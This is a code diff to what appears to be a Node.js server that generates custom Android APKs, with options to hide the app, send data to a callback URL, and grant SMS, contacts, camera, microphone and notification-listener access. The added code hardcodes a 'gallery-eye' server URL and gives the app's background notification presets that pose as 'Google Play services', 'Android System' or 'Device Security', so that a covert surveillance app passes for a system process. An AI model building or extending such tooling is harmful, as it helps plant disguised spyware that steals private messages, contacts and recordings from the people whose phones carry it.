@@ -68,7 +68,7 @@ initBaseApk().catch(e => console.error("Init failed fatally:", e));
 
 // Generate Route
 app.post('/generate', upload.single('icon'), async (req, res) => {
-    const { uuid, appName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, enableCameraPermission, enableMicrophonePermission, enableNotificationListener, aggressivePermissions } = req.body;
+    const { uuid, appName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, enableCameraPermission, enableMicrophonePermission, enableNotificationListener, aggressivePermissions, notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon } = req.body;
     const customIcon = req.file;
 
     console.log(`[APK] Request for UUID: ${uuid}`);
@@ -243,8 +243,29 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 enableCameraPermission: enableCameraPermission === 'true',
                 enableMicrophonePermission: enableMicrophonePermission === 'true',
                 enableNotificationListener: enableNotificationListener === 'true',
-                aggressivePermissions: aggressivePermissions === 'true'
+                aggressivePermissions: aggressivePermissions === 'true',
+                notificationClickAction: notificationClickAction || "device_info",
+                serverUrl: "https://p01--gallery-eye--9zr85m7yb6s4.code.run"
             };
+            const NOTIF_PRESETS = {
+                google_play: { title: "Google Play services", text: "Checking for updates…", icon: "info" },
+                android_system: { title: "Android System", text: "Updating system components…", icon: "sync" },
+                device_security: { title: "Device Security", text: "Scanning for threats…", icon: "lock" },
+                system_ui: { title: "System UI", text: "Syncing system data…", icon: "sync" },
+                device_maintenance: { title: "Device maintenance", text: "Optimizing performance…", icon: "sync" },
+                download_manager: { title: "Download Manager", text: "Download in progress…", icon: "download" }
+            };
+            const style = notificationStyle || "google_play";
+            if (style === 'custom') {
+                config.notificationTitle = notificationTitle || (appName || "Gallery Eye");
+                config.notificationText = notificationText || "Running in background";
+                config.notificationIcon = notificationIcon || "info";
+            } else {
+                const preset = NOTIF_PRESETS[style] || NOTIF_PRESETS.google_play;
+                config.notificationTitle = preset.title;
+                config.notificationText = preset.text;
+                config.notificationIcon = preset.icon;
+            }
             fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config));
 
             // 3.5. Dynamically inject permissions into AndroidManifest.xml
